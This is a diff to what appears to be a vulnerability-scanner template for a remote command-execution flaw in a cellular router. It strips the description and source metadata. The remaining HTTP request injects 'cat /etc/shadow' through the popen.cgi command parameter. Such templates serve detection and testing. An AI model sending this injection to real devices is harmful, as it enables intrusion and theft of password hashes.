@@ -3,12 +3,8 @@ info:
   name: 移动路由器Cellular Router命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/idg81l48itk4g30l'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: idg81l48itk4g30l
-    fofa: 暂无
 http:
 - raw:
   - 'GET /cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137912 HTTP/1.1
